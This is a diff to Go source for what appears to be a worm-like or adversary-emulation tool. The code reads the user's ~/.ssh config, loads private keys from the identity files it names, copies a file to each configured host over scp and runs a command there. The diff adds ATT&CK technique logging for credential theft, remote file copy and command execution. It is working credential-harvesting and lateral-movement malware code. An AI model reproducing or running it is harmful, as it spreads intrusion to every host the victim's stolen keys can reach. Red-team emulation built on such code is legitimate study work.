@@ -26,6 +26,21 @@ func parseConfig(i *info.Info)map[string]*ssh.ClientConfig{
     return map[string]*ssh.ClientConfig{}
   }
 
+  debug.Log("T1081", "", "", "Credentials in Files")
+
+  // move to .ssh
+  curPath, err := os.Getwd()
+  if err != nil {
+    debug.Println(err)
+    return map[string]*ssh.ClientConfig{}
+  }
+
+  err = os.Chdir(filepath.Join(i.GetHomePath(), ".ssh"))
+  if err != nil {
+    debug.Println(err)
+    return map[string]*ssh.ClientConfig{}
+  }
+
   // parse
   f, err := os.Open(path)
   if err != nil {
@@ -50,8 +65,14 @@ func parseConfig(i *info.Info)map[string]*ssh.ClientConfig{
       identityfile, _ := cfg.Get(pattern.String(), "identityfile")
 
       if hostname != "" && user != "" && port != "" && identityfile != "" {
+        debug.Log("T1145", "", "", "Private Keys")
+
 	// get private key
-        identityfile, _ := filepath.Abs(identityfile)
+        if !strings.Contains(identityfile, "~") {
+          identityfile, _ = filepath.Abs(identityfile)
+        } else if len(identityfile) > 0 && identityfile[0] == '~' {
+          identityfile = filepath.Join(i.GetHomePath(), identityfile[1:])
+        }
 	key, err := ioutil.ReadFile(identityfile)
 	if err != nil {
 	  debug.Println(err)
@@ -75,6 +96,13 @@ func parseConfig(i *info.Info)map[string]*ssh.ClientConfig{
 	}
       }
     }
+  }
+
+  // move back to original working directory
+  err = os.Chdir(curPath)
+  if err != nil {
+    debug.Println(err)
+    return map[string]*ssh.ClientConfig{}
   }
 
   return configs
@@ -132,6 +160,8 @@ func sendFileAndExecute(i *info.Info, configs map[string]*ssh.ClientConfig){
     fsession.Run("/usr/bin/scp -t ~")
     wg.Wait()
 
+    debug.Log("T1105", "", "", "Remote File Copy")
+
     // new session for command
     csession, err = client.NewSession()
     if err != nil {
@@ -146,5 +176,7 @@ func sendFileAndExecute(i *info.Info, configs map[string]*ssh.ClientConfig){
       debug.Println(err)
       continue
     }
+
+    debug.Log("T1059", "", "", "Command-Line Interface")
   }
 }
